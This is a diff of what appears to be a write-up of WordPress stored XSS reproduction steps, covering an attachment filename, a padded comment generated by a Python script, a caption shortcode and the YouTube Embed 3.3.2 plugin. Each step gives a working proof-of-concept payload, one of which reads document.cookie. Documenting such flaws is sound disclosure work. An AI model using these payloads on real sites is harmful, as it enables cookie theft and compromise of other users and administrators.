@@ -7,7 +7,7 @@ Steps:
 1. Intro -The XSS code can be inserted as a crafted filename of any post attachment. This post when viewed can cause malicious actions to occur on the viewers computer.
 2. The file name given to the image to be used here is:
 
-"<img src=a onerror= alert (document.cookie)>.jpg"
+`<img src=a onerror= alert (document.cookie)>.jpg`
 
 
 3. The image is uploaded in a post as an attachment file.
@@ -34,12 +34,12 @@ Steps:
 3. Create the string using the following python code to generate a file:
 
 
-out = "<a title='xonmouseover=alert(unescape(/hello%20world/.source))style=position:absolute;left:0;top:0;width:5000px;height:5000px  "
+`out = "<a title='xonmouseover=alert(unescape(/hello%20world/.source))style=position:absolute;left:0;top:0;width:5000px;height:5000px  "
 with open('xss.txt','a') as f:
     f.write(out)
     for i in range(64*1024):
         f.write('X')
-    f.write("</a>")
+    f.write("</a>")`
 
 
 4. Use the string generated in a comment on WP.
@@ -67,7 +67,7 @@ Steps:
 2. Enter the following code in a WP post:
 
 
-TEST!!![caption width="1" caption='<a href="' ">]</a><a href="http&#58;//onMouseOver='alert(1)'">Click me</a >
+`TEST!!![caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'">Click me</a >`
 
 
 3. View post to get XSS.
@@ -91,7 +91,7 @@ Steps:
 1. Intro - A stored XSS vulnerability in YouTube Embed 3.3.2 (and possibly earlier versions) allows admin users to compromise other admins and super admins. YouTube Embed is a WordPress plugin with over 30,000 active installs.
 2. Embed the following link into a WP post: 
 
-[embed src='http://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e'][/embed]
+`[embed src='http://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e'][/embed]`
 
 
 3. View post to get XSS.
